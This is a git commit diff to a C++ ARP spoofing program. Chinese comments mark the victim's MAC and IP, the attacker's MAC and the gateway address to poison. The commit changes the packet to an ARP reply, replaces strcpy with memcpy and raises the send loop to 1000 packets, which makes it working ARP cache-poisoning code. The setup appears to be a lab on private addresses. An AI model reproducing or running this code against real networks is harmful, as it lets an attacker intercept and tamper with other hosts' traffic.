708c0089ee86cb1e48c367ccc75d7fae2667ddc0
xld <1097551561@qq.com>
2021-04-03 11:22:44 +0800

    2021-4-3 11:22

--- ArpSpoof.cpp
+++ ArpSpoof.cpp
@@ -6,6 +6,8 @@ using std::cin;
 using std::endl;
 
 
+
+
 ArpSpoof::ArpSpoof(/* args */)
 {
 }
@@ -51,17 +53,22 @@ void ArpSpoof::initDevice()
 
 }
 
+
 void ArpSpoof::SetArpPacker()
 {
-    
-	u_char dhost[8];
-    dhost[0] = 0xff;
-	dhost[1] = 0xff;
-	dhost[2] = 0xff;
-	dhost[3] = 0xff;
-	dhost[4] = 0xff;
-	dhost[5] = 0xff;
-    u_char shost[8];
+    //被攻击者mac
+    //00:0c:29:c0:41:8a
+	u_char dhost[6];
+    dhost[0] = 0x00;
+	dhost[1] = 0x0c;
+	dhost[2] = 0x29;
+	dhost[3] = 0xc0;
+	dhost[4] = 0x41;
+	dhost[5] = 0x8a;
+
+    //发送方mac
+    //00-0C-29-4B-78-AB
+    u_char shost[6];
     shost[0] = 0x00;
 	shost[1] = 0x0C;
 	shost[2] = 0x29;
@@ -69,31 +76,54 @@ void ArpSpoof::SetArpPacker()
 	shost[4] = 0x78;
 	shost[5] = 0xAB;
 
-    strcpy((char *)m_arppacket.EtherHead.ether_dhost, (char *)dhost);
-    strcpy((char *)m_arppacket.EtherHead.ether_shost, (char *)shost);
+    memcpy(m_arppacket.EtherHead.ether_dhost,dhost,6);
+    memcpy(m_arppacket.EtherHead.ether_shost,shost,6);
+
+    // strcpy((char *)m_arppacket.EtherHead.ether_dhost, (char *)dhost);
+    // strcpy((char *)m_arppacket.EtherHead.ether_shost, (char *)shost);
 
     m_arppacket.EtherHead.ether_type =htons(0x0806);
     m_arppacket.ArpHead.hardware_type = htons(0x1);
     m_arppacket.ArpHead.protocol_type = htons(0x0800);
     m_arppacket.ArpHead.hardware_length = 6;
     m_arppacket.ArpHead.protocol_length = 4;
-    m_arppacket.ArpHead.operation_code = htons(0x1);
+    // m_arppacket.ArpHead.operation_code = htons(0x1); //request
+    m_arppacket.ArpHead.operation_code = htons(0x2); //reply
 
-    u_char dip[4];
-    dip[0] = 0xac;
-	dip[1] = 0x16;
-	dip[2] = 0x4a;
-	dip[3] = 0x29;
-    u_char sip[4];
-    sip[0] = 0xc0;
-	sip[1] = 0xc0;
-	sip[2] = 0xc0;
-	sip[3] = 0xc0;
+    //达到毒化目的的ip 毒化目标主机arp表中网关ip对应的mac为自身的mac
+    //192.168.204.2
+    u_char geteway [4];
+    geteway[0] = 0xc0;
+	geteway[1] = 0xa8;
+	geteway[2] = 0xcc;
+	geteway[3] = 0x2;
+
+    //被攻击者ip
+    //192.168.204.130
+    u_int dip [4];
+    dip[0] = 0xc0;
+	dip[1] = 0xa8;
+	dip[2] = 0xcc;
+	dip[3] = 0x82;
+    // u_char sip[4];
+    // sip[0] = 0xc0;
+	// sip[1] = 0xa8;
+	// sip[2] = 0xcc;
+	// sip[3] = 0x82;
+
+
+    memcpy(m_arppacket.ArpHead.destination_ethernet_address,dhost,6);
+    memcpy(m_arppacket.ArpHead.source_ip_address,geteway,4);
     
-    strcpy((char *)m_arppacket.ArpHead.source_ip_address , (char *)sip);
-    strcpy((char *)m_arppacket.ArpHead.source_ethernet_address , (char *)shost);
-    strcpy((char *)m_arppacket.ArpHead.destination_ethernet_address , (char *)dhost);
-    strcpy((char *)m_arppacket.ArpHead.destination_ip_address , (char *)dip);
+
+    memcpy(m_arppacket.ArpHead.source_ethernet_address,shost,6);
+    memcpy(m_arppacket.ArpHead.destination_ip_address,dip,4);
+
+
+    // strcpy((char *)m_arppacket.ArpHead.source_ethernet_address , (char *)shost);
+    // strcpy((char *)m_arppacket.ArpHead.source_ip_address , (char *)geteway);
+    // strcpy((char *)m_arppacket.ArpHead.destination_ethernet_address , (char *)dhost);
+    // strcpy((char *)m_arppacket.ArpHead.destination_ip_address , (char *)dip);
 
 
 }
@@ -118,7 +148,7 @@ int main()
     ArpSpoof arpspoof;
     arpspoof.initDevice();
     arpspoof.SetArpPacker();
-    int i = 100;
+    int i = 1000;
     while (i>0)
     {
         arpspoof.SendPacket();
